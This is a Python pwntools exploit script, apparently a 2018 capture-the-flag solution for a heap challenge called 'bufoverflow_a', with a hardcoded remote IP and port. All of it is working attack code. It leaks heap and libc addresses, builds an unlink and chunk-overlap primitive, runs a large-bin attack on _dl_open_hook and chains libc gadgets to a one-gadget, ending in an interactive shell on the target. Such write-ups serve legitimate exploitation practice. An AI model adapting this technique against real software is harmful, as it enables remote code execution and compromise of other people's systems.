#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./bufoverflow_a"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
heap_address=0
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("116.62.152.176",20001)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("heap address:0x%x"%heap_address)
    pause()

def alloc(size):
    conn.sendlineafter(">> ","1")
    conn.sendlineafter("Size: ",str(size))

def dele(idx):
    conn.sendlineafter(">> ","2")
    conn.sendlineafter("Index: ",str(idx))

def fill(con,line=True):
    conn.sendlineafter(">> ","3")
    if line:
        conn.sendlineafter("Content: ",con)
    else:
        conn.sendafter("Content: ",con)

def show():
    conn.sendlineafter(">> ","4")
    return conn.recvline()[:-1]

alloc(0xf8)
alloc(0xf8)
alloc(0xf8)
alloc(0xf8)
dele(0)
dele(2)
dele(3)
alloc(0x100)
heap_address=u64(show()[:6].ljust(8,"\x00"))-0x20
dele(0)
dele(1)

alloc(0xf8)
alloc(0xf8)
dele(0)
alloc(0xf8)
libc.address=u64(show().ljust(8,"\x00"))-0x399b58
dele(0)
dele(1)

alloc(0x2f8)#0
f={
    0x0:p64(heap_address+0x30+0x50-0x18),
    0x8:p64(heap_address+0x30+0x50-0x10),
    0x50:p64(heap_address+0x20),
}
fill(fit(f,filler="\x00",length=0x1f0))
alloc(0x3f8)#1
alloc(0x1f8)#2
alloc(0x1f8)#3
alloc(0x1f8)#4
dele(1)
dele(3)
alloc(0x1f8)#1
fill("a"*0x1f0+p64(0xb00))
dele(4)

alloc(0x500)#3
alloc(0x410)#4
alloc(0x428)#5
f={
    0x420-0x58:p64(libc.address+0xd6655),# rsp+0x70 == 0
    0x420-0x50:p64(libc.address+0x15c557),# jump gadget
    0x420-0x48:p64(libc.address+0x169447),# call [rax-0x50]
    0x420-0x18:p64(libc.address+0x16a013),# call [rax-0x48]
    0x420:p64(libc.address+0x47172)[:7]# call [rax-0x18]
}
fill(fit(f,filler="\xb0"))
alloc(0x420)#6
alloc(0x420)#7

dele(3)
alloc(0x500)
f={
    0x2f8:p64(0x401),
    0x308:p64(libc.sym["_dl_open_hook"]-0x10),
    0x318:p64(libc.sym["_dl_open_hook"]-0x20),
}
fill(fit(f,filler="\x00"))
dele(6)
dele(4)
alloc(0x410)
dele(0)
dele(3)

conn.interactive()

